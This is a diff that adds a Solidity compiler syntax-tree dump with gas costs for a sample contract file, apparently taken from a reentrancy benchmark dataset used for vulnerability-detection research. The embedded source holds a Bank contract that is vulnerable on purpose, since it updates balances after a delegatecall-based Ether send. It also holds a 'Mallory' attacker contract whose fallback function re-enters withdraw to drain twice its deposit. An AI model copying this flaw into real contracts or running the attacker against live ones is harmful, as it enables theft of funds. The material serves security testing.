@@ -1,0 +1,569 @@
+Syntax trees:
+
+
+======= /home/fabric/ArocRevision/Aroc/dataSet/sereum-Reentrancy/delegated.sol =======
+PragmaDirective
+   Gas costs: 0
+   Source: "pragma solidity ^0.5.0;"
+ContractDefinition "SafeSending"
+   Source: "library SafeSending {\r\n    function send(address to, uint256 amount) public {\r\n        // external call, control goes back to attacker\r\n        to.call.value(amount)(\"\");\r\n    }\r\n}"
+  FunctionDefinition "send" - public
+     Source: "function send(address to, uint256 amount) public {\r\n        // external call, control goes back to attacker\r\n        to.call.value(amount)(\"\");\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(address to, uint256 amount)"
+      VariableDeclaration "to"
+         Type: address
+         Source: "address to"
+        ElementaryTypeName address
+           Source: "address"
+      VariableDeclaration "amount"
+         Type: uint256
+         Source: "uint256 amount"
+        ElementaryTypeName uint256
+           Source: "uint256"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        // external call, control goes back to attacker\r\n        to.call.value(amount)(\"\");\r\n    }"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "to.call.value(amount)(\"\")"
+        FunctionCall
+           Type: tuple(bool,bytes memory)
+           Source: "to.call.value(amount)(\"\")"
+          FunctionCall
+             Type: function (bytes memory) payable returns (bool,bytes memory)
+             Source: "to.call.value(amount)"
+            MemberAccess to member value
+               Type: function (uint256) returns (function (bytes memory) payable returns (bool,bytes memory))
+               Source: "to.call.value"
+              MemberAccess to member call
+                 Type: function (bytes memory) payable returns (bool,bytes memory)
+                 Source: "to.call"
+                Identifier to
+                   Type: address
+                   Source: "to"
+            Identifier amount
+               Type: uint256
+               Source: "amount"
+          Literal, token: [no token] value: 
+             Type: literal_string ""
+             Source: "\"\""
+ContractDefinition "Bank"
+   Source: "contract Bank {\r\n    mapping (address => uint) public balances;\r\n    address owner;\r\n    SafeSending safesender;\r\n\r\n    constructor(SafeSending _safesender) public {\r\n    // for solidity 0.4.21\r\n    /*function Bank(SafeSending _safesender) public {*/\r\n        owner = msg.sender;\r\n        safesender = _safesender;\r\n    }\r\n\r\n    function updateSafeSender(SafeSending _new) public {\r\n        if (msg.sender == owner) {\r\n            safesender = _new;\r\n        }\r\n    }\r\n    \r\n    function getBalance(address who) public view returns(uint) {\r\n        return balances[who];\r\n    }\r\n\r\n    function donate(address to) payable public {\r\n        balances[to] += msg.value;\r\n    }\r\n\r\n    function withdraw(uint amount) public {\r\n        if (balances[msg.sender] >= amount) {\r\n            // instead of using send, transfer or call here, transfer is passed\r\n            // to the library contract, which handles sending Ether.\r\n            _libsend(msg.sender, amount);\r\n            // state update after the DELEGATECALL\r\n            balances[msg.sender] -= amount;\r\n        }\r\n    }\r\n\r\n    /*struct s { bytes4 sig; address to; uint256 amount; }*/\r\n    function _libsend(address to, uint256 amount) internal {\r\n        // call send function of the Library contract with DELEGATECALL\r\n        address(safesender).delegatecall(abi.encodeWithSignature(\"send(address,uint256)\", to, amount));\r\n        // for solidity 0.4.21\r\n        /*s memory p;                           */\r\n        /*p.sig = bytes4(0xd0679d34);           */\r\n        /*p.to = to;                            */\r\n        /*p.amount = amount;                    */\r\n        /*address(safesender).delegatecall((p));*/\r\n    }\r\n}"
+  VariableDeclaration "balances"
+     Type: mapping(address => uint256)
+     Gas costs: 431
+     Source: "mapping (address => uint) public balances"
+    Mapping
+       Source: "mapping (address => uint)"
+      ElementaryTypeName address
+         Source: "address"
+      ElementaryTypeName uint
+         Source: "uint"
+  VariableDeclaration "owner"
+     Type: address
+     Gas costs: 0
+     Source: "address owner"
+    ElementaryTypeName address
+       Source: "address"
+  VariableDeclaration "safesender"
+     Type: library SafeSending
+     Gas costs: 0
+     Source: "SafeSending safesender"
+    UserDefinedTypeName "SafeSending"
+       Source: "SafeSending"
+  FunctionDefinition "" - public
+     Source: "constructor(SafeSending _safesender) public {\r\n    // for solidity 0.4.21\r\n    /*function Bank(SafeSending _safesender) public {*/\r\n        owner = msg.sender;\r\n        safesender = _safesender;\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(SafeSending _safesender)"
+      VariableDeclaration "_safesender"
+         Type: library SafeSending
+         Source: "SafeSending _safesender"
+        UserDefinedTypeName "SafeSending"
+           Source: "SafeSending"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n    // for solidity 0.4.21\r\n    /*function Bank(SafeSending _safesender) public {*/\r\n        owner = msg.sender;\r\n        safesender = _safesender;\r\n    }"
+      ExpressionStatement
+         Gas costs: 0
+         Source: "owner = msg.sender"
+        Assignment using operator =
+           Type: address
+           Source: "owner = msg.sender"
+          Identifier owner
+             Type: address
+             Source: "owner"
+          MemberAccess to member sender
+             Type: address payable
+             Source: "msg.sender"
+            Identifier msg
+               Type: msg
+               Source: "msg"
+      ExpressionStatement
+         Gas costs: 0
+         Source: "safesender = _safesender"
+        Assignment using operator =
+           Type: library SafeSending
+           Source: "safesender = _safesender"
+          Identifier safesender
+             Type: library SafeSending
+             Source: "safesender"
+          Identifier _safesender
+             Type: library SafeSending
+             Source: "_safesender"
+  FunctionDefinition "updateSafeSender" - public
+     Source: "function updateSafeSender(SafeSending _new) public {\r\n        if (msg.sender == owner) {\r\n            safesender = _new;\r\n        }\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(SafeSending _new)"
+      VariableDeclaration "_new"
+         Type: library SafeSending
+         Source: "SafeSending _new"
+        UserDefinedTypeName "SafeSending"
+           Source: "SafeSending"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        if (msg.sender == owner) {\r\n            safesender = _new;\r\n        }\r\n    }"
+      IfStatement
+         Source: "if (msg.sender == owner) {\r\n            safesender = _new;\r\n        }"
+        BinaryOperation using operator ==
+           Type: bool
+           Gas costs: 256
+           Source: "msg.sender == owner"
+          MemberAccess to member sender
+             Type: address payable
+             Source: "msg.sender"
+            Identifier msg
+               Type: msg
+               Source: "msg"
+          Identifier owner
+             Type: address
+             Source: "owner"
+        Block
+           Source: "{\r\n            safesender = _new;\r\n        }"
+          ExpressionStatement
+             Gas costs: 20267
+             Source: "safesender = _new"
+            Assignment using operator =
+               Type: library SafeSending
+               Source: "safesender = _new"
+              Identifier safesender
+                 Type: library SafeSending
+                 Source: "safesender"
+              Identifier _new
+                 Type: library SafeSending
+                 Source: "_new"
+  FunctionDefinition "getBalance" - public - const
+     Source: "function getBalance(address who) public view returns(uint) {\r\n        return balances[who];\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(address who)"
+      VariableDeclaration "who"
+         Type: address
+         Source: "address who"
+        ElementaryTypeName address
+           Source: "address"
+    ParameterList
+       Gas costs: 3
+       Source: "(uint)"
+      VariableDeclaration ""
+         Type: uint256
+         Source: "uint"
+        ElementaryTypeName uint
+           Source: "uint"
+    Block
+       Source: "{\r\n        return balances[who];\r\n    }"
+      Return
+         Gas costs: 304
+         Source: "return balances[who]"
+        IndexAccess
+           Type: uint256
+           Source: "balances[who]"
+          Identifier balances
+             Type: mapping(address => uint256)
+             Source: "balances"
+          Identifier who
+             Type: address
+             Source: "who"
+  FunctionDefinition "donate" - public
+     Source: "function donate(address to) payable public {\r\n        balances[to] += msg.value;\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(address to)"
+      VariableDeclaration "to"
+         Type: address
+         Source: "address to"
+        ElementaryTypeName address
+           Source: "address"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        balances[to] += msg.value;\r\n    }"
+      ExpressionStatement
+         Gas costs: 20328
+         Source: "balances[to] += msg.value"
+        Assignment using operator +=
+           Type: uint256
+           Source: "balances[to] += msg.value"
+          IndexAccess
+             Type: uint256
+             Source: "balances[to]"
+            Identifier balances
+               Type: mapping(address => uint256)
+               Source: "balances"
+            Identifier to
+               Type: address
+               Source: "to"
+          MemberAccess to member value
+             Type: uint256
+             Source: "msg.value"
+            Identifier msg
+               Type: msg
+               Source: "msg"
+  FunctionDefinition "withdraw" - public
+     Source: "function withdraw(uint amount) public {\r\n        if (balances[msg.sender] >= amount) {\r\n            // instead of using send, transfer or call here, transfer is passed\r\n            // to the library contract, which handles sending Ether.\r\n            _libsend(msg.sender, amount);\r\n            // state update after the DELEGATECALL\r\n            balances[msg.sender] -= amount;\r\n        }\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(uint amount)"
+      VariableDeclaration "amount"
+         Type: uint256
+         Source: "uint amount"
+        ElementaryTypeName uint
+           Source: "uint"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        if (balances[msg.sender] >= amount) {\r\n            // instead of using send, transfer or call here, transfer is passed\r\n            // to the library contract, which handles sending Ether.\r\n            _libsend(msg.sender, amount);\r\n            // state update after the DELEGATECALL\r\n            balances[msg.sender] -= amount;\r\n        }\r\n    }"
+      IfStatement
+         Source: "if (balances[msg.sender] >= amount) {\r\n            // instead of using send, transfer or call here, transfer is passed\r\n            // to the library contract, which handles sending Ether.\r\n            _libsend(msg.sender, amount);\r\n            // state update after the DELEGATECALL\r\n            balances[msg.sender] -= amount;\r\n        }"
+        BinaryOperation using operator >=
+           Type: bool
+           Gas costs: 307
+           Source: "balances[msg.sender] >= amount"
+          IndexAccess
+             Type: uint256
+             Source: "balances[msg.sender]"
+            Identifier balances
+               Type: mapping(address => uint256)
+               Source: "balances"
+            MemberAccess to member sender
+               Type: address payable
+               Source: "msg.sender"
+              Identifier msg
+                 Type: msg
+                 Source: "msg"
+          Identifier amount
+             Type: uint256
+             Source: "amount"
+        Block
+           Source: "{\r\n            // instead of using send, transfer or call here, transfer is passed\r\n            // to the library contract, which handles sending Ether.\r\n            _libsend(msg.sender, amount);\r\n            // state update after the DELEGATECALL\r\n            balances[msg.sender] -= amount;\r\n        }"
+          ExpressionStatement
+             Gas costs: 9
+             Source: "_libsend(msg.sender, amount)"
+            FunctionCall
+               Type: tuple()
+               Source: "_libsend(msg.sender, amount)"
+              Identifier _libsend
+                 Type: function (address,uint256)
+                 Source: "_libsend"
+              MemberAccess to member sender
+                 Type: address payable
+                 Source: "msg.sender"
+                Identifier msg
+                   Type: msg
+                   Source: "msg"
+              Identifier amount
+                 Type: uint256
+                 Source: "amount"
+          ExpressionStatement
+             Gas costs: 20328
+             Source: "balances[msg.sender] -= amount"
+            Assignment using operator -=
+               Type: uint256
+               Source: "balances[msg.sender] -= amount"
+              IndexAccess
+                 Type: uint256
+                 Source: "balances[msg.sender]"
+                Identifier balances
+                   Type: mapping(address => uint256)
+                   Source: "balances"
+                MemberAccess to member sender
+                   Type: address payable
+                   Source: "msg.sender"
+                  Identifier msg
+                     Type: msg
+                     Source: "msg"
+              Identifier amount
+                 Type: uint256
+                 Source: "amount"
+  FunctionDefinition "_libsend"
+     Source: "function _libsend(address to, uint256 amount) internal {\r\n        // call send function of the Library contract with DELEGATECALL\r\n        address(safesender).delegatecall(abi.encodeWithSignature(\"send(address,uint256)\", to, amount));\r\n        // for solidity 0.4.21\r\n        /*s memory p;                           */\r\n        /*p.sig = bytes4(0xd0679d34);           */\r\n        /*p.to = to;                            */\r\n        /*p.amount = amount;                    */\r\n        /*address(safesender).delegatecall((p));*/\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(address to, uint256 amount)"
+      VariableDeclaration "to"
+         Type: address
+         Source: "address to"
+        ElementaryTypeName address
+           Source: "address"
+      VariableDeclaration "amount"
+         Type: uint256
+         Source: "uint256 amount"
+        ElementaryTypeName uint256
+           Source: "uint256"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        // call send function of the Library contract with DELEGATECALL\r\n        address(safesender).delegatecall(abi.encodeWithSignature(\"send(address,uint256)\", to, amount));\r\n        // for solidity 0.4.21\r\n        /*s memory p;                           */\r\n        /*p.sig = bytes4(0xd0679d34);           */\r\n        /*p.to = to;                            */\r\n        /*p.amount = amount;                    */\r\n        /*address(safesender).delegatecall((p));*/\r\n    }"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "address(safesender).delegatecall(abi.encodeWithSignature(\"send(address,uint256)\", to, amount))"
+        FunctionCall
+           Type: tuple(bool,bytes memory)
+           Source: "address(safesender).delegatecall(abi.encodeWithSignature(\"send(address,uint256)\", to, amount))"
+          MemberAccess to member delegatecall
+             Type: function (bytes memory) returns (bool,bytes memory)
+             Source: "address(safesender).delegatecall"
+            FunctionCall
+               Type: address
+               Source: "address(safesender)"
+              ElementaryTypeNameExpression address
+                 Type: type(address)
+                 Source: "address"
+              Identifier safesender
+                 Type: library SafeSending
+                 Source: "safesender"
+          FunctionCall
+             Type: bytes memory
+             Source: "abi.encodeWithSignature(\"send(address,uint256)\", to, amount)"
+            MemberAccess to member encodeWithSignature
+               Type: function (string memory) pure returns (bytes memory)
+               Source: "abi.encodeWithSignature"
+              Identifier abi
+                 Type: abi
+                 Source: "abi"
+            Literal, token: [no token] value: send(address,uint256)
+               Type: literal_string "send(address,uint256)"
+               Source: "\"send(address,uint256)\""
+            Identifier to
+               Type: address
+               Source: "to"
+            Identifier amount
+               Type: uint256
+               Source: "amount"
+ContractDefinition "Mallory"
+   Source: "contract Mallory {\r\n    Bank public victim;\r\n    uint256 abort;\r\n\r\n    function donate() external payable {}\r\n\r\n    function attack(Bank addr) public payable {\r\n        victim = addr;\r\n        abort = 0;\r\n        victim.withdraw(victim.getBalance(address(this)));\r\n    }\r\n\r\n    function withdraw(Bank addr) public {\r\n        addr.withdraw(addr.getBalance(address(this)));\r\n    }\r\n\r\n    function () external payable {\r\n        if (abort == 0) {\r\n            abort = 1;  // abort after second re-entrancy to avoid out-of-gas\r\n            // withdraw a second time, s.t. we withdraw 2x the balance we\r\n            // invested into the victim Bank contract.\r\n            victim.withdraw(victim.getBalance(address(this)));\r\n        }\r\n    }\r\n}"
+  VariableDeclaration "victim"
+     Type: contract Bank
+     Gas costs: 335
+     Source: "Bank public victim"
+    UserDefinedTypeName "Bank"
+       Source: "Bank"
+  VariableDeclaration "abort"
+     Type: uint256
+     Gas costs: 0
+     Source: "uint256 abort"
+    ElementaryTypeName uint256
+       Source: "uint256"
+  FunctionDefinition "donate" - public
+     Source: "function donate() external payable {}"
+    ParameterList
+       Gas costs: 0
+       Source: "()"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Gas costs: 0
+       Source: "{}"
+  FunctionDefinition "attack" - public
+     Source: "function attack(Bank addr) public payable {\r\n        victim = addr;\r\n        abort = 0;\r\n        victim.withdraw(victim.getBalance(address(this)));\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(Bank addr)"
+      VariableDeclaration "addr"
+         Type: contract Bank
+         Source: "Bank addr"
+        UserDefinedTypeName "Bank"
+           Source: "Bank"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        victim = addr;\r\n        abort = 0;\r\n        victim.withdraw(victim.getBalance(address(this)));\r\n    }"
+      ExpressionStatement
+         Gas costs: 20267
+         Source: "victim = addr"
+        Assignment using operator =
+           Type: contract Bank
+           Source: "victim = addr"
+          Identifier victim
+             Type: contract Bank
+             Source: "victim"
+          Identifier addr
+             Type: contract Bank
+             Source: "addr"
+      ExpressionStatement
+         Gas costs: 5014
+         Source: "abort = 0"
+        Assignment using operator =
+           Type: uint256
+           Source: "abort = 0"
+          Identifier abort
+             Type: uint256
+             Source: "abort"
+          Literal, token: [no token] value: 0
+             Type: int_const 0
+             Source: "0"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "victim.withdraw(victim.getBalance(address(this)))"
+        FunctionCall
+           Type: tuple()
+           Source: "victim.withdraw(victim.getBalance(address(this)))"
+          MemberAccess to member withdraw
+             Type: function (uint256) external
+             Source: "victim.withdraw"
+            Identifier victim
+               Type: contract Bank
+               Source: "victim"
+          FunctionCall
+             Type: uint256
+             Source: "victim.getBalance(address(this))"
+            MemberAccess to member getBalance
+               Type: function (address) view external returns (uint256)
+               Source: "victim.getBalance"
+              Identifier victim
+                 Type: contract Bank
+                 Source: "victim"
+            FunctionCall
+               Type: address payable
+               Source: "address(this)"
+              ElementaryTypeNameExpression address
+                 Type: type(address)
+                 Source: "address"
+              Identifier this
+                 Type: contract Mallory
+                 Source: "this"
+  FunctionDefinition "withdraw" - public
+     Source: "function withdraw(Bank addr) public {\r\n        addr.withdraw(addr.getBalance(address(this)));\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(Bank addr)"
+      VariableDeclaration "addr"
+         Type: contract Bank
+         Source: "Bank addr"
+        UserDefinedTypeName "Bank"
+           Source: "Bank"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        addr.withdraw(addr.getBalance(address(this)));\r\n    }"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "addr.withdraw(addr.getBalance(address(this)))"
+        FunctionCall
+           Type: tuple()
+           Source: "addr.withdraw(addr.getBalance(address(this)))"
+          MemberAccess to member withdraw
+             Type: function (uint256) external
+             Source: "addr.withdraw"
+            Identifier addr
+               Type: contract Bank
+               Source: "addr"
+          FunctionCall
+             Type: uint256
+             Source: "addr.getBalance(address(this))"
+            MemberAccess to member getBalance
+               Type: function (address) view external returns (uint256)
+               Source: "addr.getBalance"
+              Identifier addr
+                 Type: contract Bank
+                 Source: "addr"
+            FunctionCall
+               Type: address payable
+               Source: "address(this)"
+              ElementaryTypeNameExpression address
+                 Type: type(address)
+                 Source: "address"
+              Identifier this
+                 Type: contract Mallory
+                 Source: "this"
+  FunctionDefinition "" - public
+     Source: "function () external payable {\r\n        if (abort == 0) {\r\n            abort = 1;  // abort after second re-entrancy to avoid out-of-gas\r\n            // withdraw a second time, s.t. we withdraw 2x the balance we\r\n            // invested into the victim Bank contract.\r\n            victim.withdraw(victim.getBalance(address(this)));\r\n        }\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "()"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        if (abort == 0) {\r\n            abort = 1;  // abort after second re-entrancy to avoid out-of-gas\r\n            // withdraw a second time, s.t. we withdraw 2x the balance we\r\n            // invested into the victim Bank contract.\r\n            victim.withdraw(victim.getBalance(address(this)));\r\n        }\r\n    }"
+      IfStatement
+         Source: "if (abort == 0) {\r\n            abort = 1;  // abort after second re-entrancy to avoid out-of-gas\r\n            // withdraw a second time, s.t. we withdraw 2x the balance we\r\n            // invested into the victim Bank contract.\r\n            victim.withdraw(victim.getBalance(address(this)));\r\n        }"
+        BinaryOperation using operator ==
+           Type: bool
+           Gas costs: 209
+           Source: "abort == 0"
+          Identifier abort
+             Type: uint256
+             Source: "abort"
+          Literal, token: [no token] value: 0
+             Type: int_const 0
+             Source: "0"
+        Block
+           Source: "{\r\n            abort = 1;  // abort after second re-entrancy to avoid out-of-gas\r\n            // withdraw a second time, s.t. we withdraw 2x the balance we\r\n            // invested into the victim Bank contract.\r\n            victim.withdraw(victim.getBalance(address(this)));\r\n        }"
+          ExpressionStatement
+             Gas costs: 20014
+             Source: "abort = 1"
+            Assignment using operator =
+               Type: uint256
+               Source: "abort = 1"
+              Identifier abort
+                 Type: uint256
+                 Source: "abort"
+              Literal, token: [no token] value: 1
+                 Type: int_const 1
+                 Source: "1"
+          ExpressionStatement
+             Gas costs: [???]
+             Source: "victim.withdraw(victim.getBalance(address(this)))"
+            FunctionCall
+               Type: tuple()
+               Source: "victim.withdraw(victim.getBalance(address(this)))"
+              MemberAccess to member withdraw
+                 Type: function (uint256) external
+                 Source: "victim.withdraw"
+                Identifier victim
+                   Type: contract Bank
+                   Source: "victim"
+              FunctionCall
+                 Type: uint256
+                 Source: "victim.getBalance(address(this))"
+                MemberAccess to member getBalance
+                   Type: function (address) view external returns (uint256)
+                   Source: "victim.getBalance"
+                  Identifier victim
+                     Type: contract Bank
+                     Source: "victim"
+                FunctionCall
+                   Type: address payable
+                   Source: "address(this)"
+                  ElementaryTypeNameExpression address
+                     Type: type(address)
+                     Source: "address"
+                  Identifier this
+                     Type: contract Mallory
+                     Source: "this"
